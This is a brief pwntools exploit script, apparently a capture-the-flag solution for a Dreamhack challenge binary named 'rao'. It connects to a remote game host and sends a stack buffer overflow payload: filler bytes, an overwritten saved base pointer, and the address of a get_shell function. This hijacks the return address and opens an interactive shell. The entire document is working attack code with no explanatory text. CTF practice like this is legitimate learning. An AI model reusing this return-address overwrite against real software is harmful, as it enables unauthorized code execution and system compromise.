from pwn import *

#p = process('./rao')
r = remote(host='host3.dreamhack.games', port=16102)
e = ELF('./rao')

get_shell = e.symbols['get_shell']

payload = b'a'*0x30+ b'b'*0x8 + p64(get_shell)

r.sendlineafter('Input: ', payload)

r.interactive()